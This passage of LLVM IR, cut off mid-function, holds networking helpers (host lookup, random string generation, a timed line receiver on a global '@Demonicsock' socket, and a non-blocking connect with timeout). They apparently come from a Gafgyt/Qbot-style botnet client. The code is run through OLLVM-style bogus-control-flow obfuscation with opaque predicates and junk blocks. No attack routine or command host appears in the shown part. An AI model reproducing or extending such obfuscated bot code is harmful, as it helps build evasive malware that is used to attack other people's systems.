; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.21
  %15 = load i32, i32* @y.22
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.21
  %23 = load i32, i32* @y.22
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %12
  %31 = load i32, i32* %3, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.25
  %5 = load i32, i32* @y.26
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.25
  %33 = load i32, i32* @y.26
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #6, !srcloc !1
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* @x.25
  %51 = load i32, i32* @y.26
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* %13, align 4
  %59 = srem i32 %58, 64
  %60 = zext i32 %59 to i64
  %61 = shl i64 1, %60
  %62 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %63 = load i32, i32* %13, align 4
  %64 = sdiv i32 %63, 64
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [16 x i64], [16 x i64]* %62, i64 0, i64 %65
  %67 = load i64, i64* %66, align 8
  %68 = or i64 %67, %61
  store i64 %68, i64* %66, align 8
  %69 = load i32, i32* %13, align 4
  %70 = add nsw i32 %69, 1
  %71 = call i32 @select(i32 %70, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %71, i32* %20, align 4
  %72 = icmp sle i32 %71, 0
  %73 = load i32, i32* @x.25
  %74 = load i32, i32* @y.26
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart252, label %originalBB1alteredBB

originalBBpart252:                                ; preds = %originalBB1
  br i1 %72, label %81, label %150

; <label>:81:                                     ; preds = %originalBBpart252
  br label %82

; <label>:82:                                     ; preds = %129, %81
  %83 = load i32, i32* %21, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %133

; <label>:85:                                     ; preds = %82
  %86 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %86, align 8
  %87 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %87, align 8
  br label %88

; <label>:88:                                     ; preds = %85
  %89 = load i32, i32* @x.25
  %90 = load i32, i32* @y.26
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %88
  %97 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %98 = getelementptr inbounds [16 x i64], [16 x i64]* %97, i64 0, i64 0
  %99 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %98) #6, !srcloc !2
  %100 = extractvalue { i64, i64* } %99, 0
  %101 = extractvalue { i64, i64* } %99, 1
  %102 = trunc i64 %100 to i32
  store i32 %102, i32* %22, align 4
  %103 = ptrtoint i64* %101 to i64
  %104 = trunc i64 %103 to i32
  store i32 %104, i32* %23, align 4
  %105 = load i32, i32* @x.25
  %106 = load i32, i32* @y.26
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %113

; <label>:113:                                    ; preds = %originalBBpart256
  %114 = load i32, i32* %13, align 4
  %115 = srem i32 %114, 64
  %116 = zext i32 %115 to i64
  %117 = shl i64 1, %116
  %118 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %119 = load i32, i32* %13, align 4
  %120 = sdiv i32 %119, 64
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 %121
  %123 = load i64, i64* %122, align 8
  %124 = or i64 %123, %117
  store i64 %124, i64* %122, align 8
  %125 = load i32, i32* %13, align 4
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %127, i32* %20, align 4
  %128 = icmp sle i32 %127, 0
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %113
  %130 = load i32, i32* %21, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %21, align 4
  br label %82

; <label>:132:                                    ; preds = %113
  br label %133

; <label>:133:                                    ; preds = %132, %82
  %134 = load i32, i32* @x.25
  %135 = load i32, i32* @y.26
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %133
  %142 = load i32, i32* @x.25
  %143 = load i32, i32* @y.26
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %150

; <label>:150:                                    ; preds = %originalBBpart260, %originalBBpart252
  %151 = load i32, i32* @x.25
  %152 = load i32, i32* @y.26
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %150
  store i32 0, i32* %26, align 4
  %159 = load i8*, i8** %14, align 8
  store i8* %159, i8** %25, align 8
  %160 = load i32, i32* @x.25
  %161 = load i32, i32* @y.26
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %168

; <label>:168:                                    ; preds = %218, %originalBBpart264
  %169 = load i32, i32* @x.25
  %170 = load i32, i32* @y.26
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %168
  %177 = load i32, i32* %15, align 4
  %178 = add nsw i32 %177, -1
  store i32 %178, i32* %15, align 4
  %179 = icmp sgt i32 %177, 1
  %180 = load i32, i32* @x.25
  %181 = load i32, i32* @y.26
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart274, label %originalBB66alteredBB

originalBBpart274:                                ; preds = %originalBB66
  br i1 %179, label %188, label %221

; <label>:188:                                    ; preds = %originalBBpart274
  %189 = load i32, i32* @Demonicsock, align 4
  %190 = call i64 @recv(i32 %189, i8* %24, i64 1, i32 0)
  %191 = icmp ne i64 %190, 1
  br i1 %191, label %192, label %210

; <label>:192:                                    ; preds = %188
  %193 = load i32, i32* @x.25
  %194 = load i32, i32* @y.26
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %192
  %201 = load i8*, i8** %25, align 8
  store i8 0, i8* %201, align 1
  store i32 -1, i32* %12, align 4
  %202 = load i32, i32* @x.25
  %203 = load i32, i32* @y.26
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %224

; <label>:210:                                    ; preds = %188
  %211 = load i8, i8* %24, align 1
  %212 = load i8*, i8** %25, align 8
  %213 = getelementptr inbounds i8, i8* %212, i32 1
  store i8* %213, i8** %25, align 8
  store i8 %211, i8* %212, align 1
  %214 = load i8, i8* %24, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 10
  br i1 %216, label %217, label %218

; <label>:217:                                    ; preds = %210
  br label %221

; <label>:218:                                    ; preds = %210
  %219 = load i32, i32* %26, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %26, align 4
  br label %168

; <label>:221:                                    ; preds = %217, %originalBBpart274
  %222 = load i8*, i8** %25, align 8
  store i8 0, i8* %222, align 1
  %223 = load i32, i32* %26, align 4
  store i32 %223, i32* %12, align 4
  br label %224

; <label>:224:                                    ; preds = %221, %originalBBpart278
  %225 = load i32, i32* @x.25
  %226 = load i32, i32* @y.26
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %224
  %233 = load i32, i32* %12, align 4
  %234 = load i32, i32* @x.25
  %235 = load i32, i32* @y.26
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  ret i32 %233

originalBBalteredBB:                              ; preds = %originalBB, %3
  %242 = alloca i32, align 4
  %243 = alloca i32, align 4
  %244 = alloca i8*, align 8
  %245 = alloca i32, align 4
  %246 = alloca %struct.fd_set, align 8
  %247 = alloca %struct.timeval, align 8
  %248 = alloca i32, align 4
  %249 = alloca i32, align 4
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i8, align 1
  %255 = alloca i8*, align 8
  %256 = alloca i32, align 4
  store i32 %0, i32* %243, align 4
  store i8* %1, i8** %244, align 8
  store i32 %2, i32* %245, align 4
  %257 = load i8*, i8** %244, align 8
  %258 = load i32, i32* %245, align 4
  %259 = sext i32 %258 to i64
  call void @llvm.memset.p0i8.i64(i8* %257, i8 0, i64 %259, i32 1, i1 false)
  %260 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 0
  store i64 30, i64* %260, align 8
  %261 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 1
  store i64 0, i64* %261, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %262 = load i32, i32* %13, align 4
  %_ = shl i32 %262, 64
  %_2 = sub i32 %262, 64
  %gen = mul i32 %_2, 64
  %_3 = sub i32 %262, 64
  %gen4 = mul i32 %_3, 64
  %_5 = shl i32 %262, 64
  %_6 = sub i32 %262, 64
  %gen7 = mul i32 %_6, 64
  %_8 = sub i32 %262, 64
  %gen9 = mul i32 %_8, 64
  %_10 = sub i32 %262, 64
  %gen11 = mul i32 %_10, 64
  %263 = srem i32 %262, 64
  %264 = zext i32 %263 to i64
  %_12 = shl i64 1, %264
  %_13 = sub i64 0, 1
  %gen14 = add i64 %_13, %264
  %_15 = sub i64 0, 1
  %gen16 = add i64 %_15, %264
  %_17 = sub i64 1, %264
  %gen18 = mul i64 %_17, %264
  %_19 = sub i64 1, %264
  %gen20 = mul i64 %_19, %264
  %_21 = shl i64 1, %264
  %265 = shl i64 1, %264
  %266 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %267 = load i32, i32* %13, align 4
  %_22 = sub i32 0, %267
  %gen23 = add i32 %_22, 64
  %_24 = sub i32 0, %267
  %gen25 = add i32 %_24, 64
  %_26 = shl i32 %267, 64
  %_27 = shl i32 %267, 64
  %_28 = sub i32 0, %267
  %gen29 = add i32 %_28, 64
  %_30 = sub i32 %267, 64
  %gen31 = mul i32 %_30, 64
  %268 = sdiv i32 %267, 64
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [16 x i64], [16 x i64]* %266, i64 0, i64 %269
  %271 = load i64, i64* %270, align 8
  %_32 = sub i64 %271, %265
  %gen33 = mul i64 %_32, %265
  %_34 = sub i64 %271, %265
  %gen35 = mul i64 %_34, %265
  %_36 = sub i64 %271, %265
  %gen37 = mul i64 %_36, %265
  %_38 = sub i64 0, %271
  %gen39 = add i64 %_38, %265
  %_40 = shl i64 %271, %265
  %_41 = sub i64 0, %271
  %gen42 = add i64 %_41, %265
  %_43 = sub i64 %271, %265
  %gen44 = mul i64 %_43, %265
  %272 = or i64 %271, %265
  store i64 %272, i64* %270, align 8
  %273 = load i32, i32* %13, align 4
  %_45 = shl i32 %273, 1
  %_46 = sub i32 %273, 1
  %gen47 = mul i32 %_46, 1
  %_48 = shl i32 %273, 1
  %_49 = sub i32 %273, 1
  %gen50 = mul i32 %_49, 1
  %274 = add nsw i32 %273, 1
  %275 = call i32 @select(i32 %274, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %275, i32* %20, align 4
  %276 = icmp sle i32 %275, 0
  br label %originalBB1

originalBB54alteredBB:                            ; preds = %originalBB54, %88
  %277 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %278 = getelementptr inbounds [16 x i64], [16 x i64]* %277, i64 0, i64 0
  %279 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %278) #6, !srcloc !2
  %280 = extractvalue { i64, i64* } %279, 0
  %281 = extractvalue { i64, i64* } %279, 1
  %282 = trunc i64 %280 to i32
  store i32 %282, i32* %22, align 4
  %283 = ptrtoint i64* %281 to i64
  %284 = trunc i64 %283 to i32
  store i32 %284, i32* %23, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %133
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %150
  store i32 0, i32* %26, align 4
  %285 = load i8*, i8** %14, align 8
  store i8* %285, i8** %25, align 8
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %168
  %286 = load i32, i32* %15, align 4
  %_67 = shl i32 %286, -1
  %_68 = sub i32 %286, -1
  %gen69 = mul i32 %_68, -1
  %_70 = sub i32 %286, -1
  %gen71 = mul i32 %_70, -1
  %_72 = shl i32 %286, -1
  %287 = add nsw i32 %286, -1
  store i32 %287, i32* %15, align 4
  %288 = icmp sgt i32 %286, 1
  br label %originalBB66

originalBB76alteredBB:                            ; preds = %originalBB76, %192
  %289 = load i8*, i8** %25, align 8
  store i8 0, i8* %289, align 1
  store i32 -1, i32* %12, align 4
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %224
  %290 = load i32, i32* %12, align 4
  br label %originalBB80
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %4
  %37 = load i32, i32* @x.27
  %38 = load i32, i32* @y.28
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %5, align 4
  %45 = load i32, i32* @x.27
  %46 = load i32, i32* @y.28
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %180

; <label>:53:                                     ; preds = %4
  %54 = load i32, i32* @x.27
  %55 = load i32, i32* @y.28
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = load i32, i32* %6, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 16)
  store i32 %66, i32* %16, align 4
  %67 = load i32, i32* %16, align 4
  %68 = icmp slt i32 %67, 0
  %69 = load i32, i32* @x.27
  %70 = load i32, i32* @y.28
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %68, label %77, label %155

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = call i32* @__errno_location() #9
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %81, label %153

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @x.27
  %83 = load i32, i32* @y.28
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %81
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %91, i64* %92, align 8
  %93 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %93, align 8
  %94 = load i32, i32* @x.27
  %95 = load i32, i32* @y.28
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %102

; <label>:102:                                    ; preds = %originalBBpart28
  %103 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %103, i64 0, i64 0
  %105 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %104) #6, !srcloc !3
  %106 = extractvalue { i64, i64* } %105, 0
  %107 = extractvalue { i64, i64* } %105, 1
  %108 = trunc i64 %106 to i32
  store i32 %108, i32* %17, align 4
  %109 = ptrtoint i64* %107 to i64
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %18, align 4
  br label %111

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* %6, align 4
  %113 = srem i32 %112, 64
  %114 = zext i32 %113 to i64
  %115 = shl i64 1, %114
  %116 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %117 = load i32, i32* %6, align 4
  %118 = sdiv i32 %117, 64
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 %119
  %121 = load i64, i64* %120, align 8
  %122 = or i64 %121, %115
  store i64 %122, i64* %120, align 8
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  %125 = call i32 @select(i32 %124, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %126 = icmp sgt i32 %125, 0
  br i1 %126, label %127, label %151

; <label>:127:                                    ; preds = %111
  %128 = load i32, i32* @x.27
  %129 = load i32, i32* @y.28
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  store i32 4, i32* %13, align 4
  %136 = load i32, i32* %6, align 4
  %137 = bitcast i32* %14 to i8*
  %138 = call i32 @getsockopt(i32 %136, i32 1, i32 4, i8* %137, i32* %13) #6
  %139 = load i32, i32* %14, align 4
  %140 = icmp ne i32 %139, 0
  %141 = load i32, i32* @x.27
  %142 = load i32, i32* @y.28
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %140, label %149, label %150

; <label>:149:                                    ; preds = %originalBBpart212
  store i32 0, i32* %5, align 4
  br label %180

; <label>:150:                                    ; preds = %originalBBpart212
  br label %152

; <label>:151:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %180

; <label>:152:                                    ; preds = %150
  br label %154

; <label>:153:                                    ; preds = %77
  store i32 0, i32* %5, align 4
  br label %180

; <label>:154:                                    ; preds = %152
  br label %155

